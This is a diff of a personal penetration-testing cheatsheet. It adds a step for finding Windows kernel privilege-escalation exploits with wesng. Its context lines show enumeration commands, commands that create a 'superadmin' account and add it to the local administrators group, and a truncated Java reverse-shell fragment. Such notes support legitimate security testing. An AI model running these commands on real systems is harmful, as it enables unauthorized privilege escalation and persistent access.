@@ -1,5 +1,5 @@
 # My Notes / Cheatsheet
-### Last Updated: 11 Sep 2021
+### Last Updated: 22 Sep 2021
 Notes related to Vuln Assmnt/PenTesting 
 
 #### Approach for Compromising a box
@@ -406,7 +406,11 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 > 1. total users present - ```net users```
 > 1. specific user details - ```net user <username>```
 > 1. FW status - ```netsh firewall show state```
-
+	
+##### PrivESC Methodology for Windows - Kernel Exploits with wesng (Preferable Windows < Windows 10)
+> 1. URL: https://github.com/bitsadmin/wesng
+> 1. ```python wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only | more```
+	
 ##### Windows add an Admin user from CMD
 > 1. net user /add [username] [password] ---> ```net user /add superadmin Superadmin123$```
 > 1. net localgroup administrators [username] /add ---> ```net localgroup administrators superadmin```
